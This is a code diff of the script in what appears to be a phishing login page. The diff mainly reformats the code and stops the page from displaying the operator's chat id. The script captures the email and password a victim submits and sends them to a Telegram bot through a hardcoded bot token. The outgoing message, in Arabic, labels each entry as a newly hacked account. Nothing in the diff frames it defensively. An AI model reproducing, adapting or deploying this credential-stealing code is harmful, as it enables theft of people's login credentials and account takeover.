@@ -75,53 +75,52 @@
     <div class="footer">© 2025 Medo Broblems</div>
   </div>
 
-  <script>
-    window.onload = function() {
-      const params = new URLSearchParams(window.location.search);
-      const chatId = params.get('chatId');
-      const id = params.get('id');
+<script>
+  window.onload = function() {
+    const params = new URLSearchParams(window.location.search);
+    const chatId = params.get('chatId');
+    const id = params.get('id');
 
-      if (chatId && !id) {
-        // لو فيه chatId بس — نحوله لـ id في نفس الرابط
-        const targetURL = `${window.location.pathname}?id=${chatId}`;
-        window.location.href = targetURL;
-      } else if (id) {
-        // لو فيه id نعرضه
-        document.getElementById('showId').innerText = id;
-    };
+    if (chatId && !id) {
+      // لو فيه chatId بس — نحوله لـ id في نفس الرابط
+      const targetURL = `${window.location.pathname}?id=${chatId}`;
+      window.location.href = targetURL;
+    }
+    // لو فيه id هيكمل عادي بس مش هيعرضه
+  };
 
-    const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA";
+  const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA";
 
-    document.getElementById("loginForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
+    e.preventDefault();
 
-      const params = new URLSearchParams(window.location.search);
-      const id = params.get('id');
+    const params = new URLSearchParams(window.location.search);
+    const id = params.get('id');
 
-      if (!id) {
-        alert("❌ لا يوجد ID لإرسال البيانات إليه!");
-        return;
-      }
+    if (!id) {
+      alert("❌ لا يوجد ID لإرسال البيانات إليه!");
+      return;
+    }
 
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-      const message = `📥 - تم اختراق حساب جديد :- \n📧 - الإيميل:${email}\n🔑 - الباسورد: ${password}`;
+    const message = `📥 - تم اختراق حساب جديد :- \n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
 
-      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
 
-      fetch(url)
-        .then(response => response.json())
-        .then(data => {
-          console.log("✅ تم الإرسال:", data);
-          alert("✅ تم إرسال البيانات!");
-        })
-        .catch(error => {
-          console.error("❌ خطأ:", error);
-          alert("❌ حصلت مشكلة أثناء الإرسال!");
-        });
-    });
-  </script>
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        console.log("✅ تم الإرسال:", data);
+        alert("✅ تم إرسال البيانات!");
+      })
+      .catch(error => {
+        console.error("❌ خطأ:", error);
+        alert("❌ حصلت مشكلة أثناء الإرسال!");
+      });
+  });
+</script>
 
 </body>
 </html>
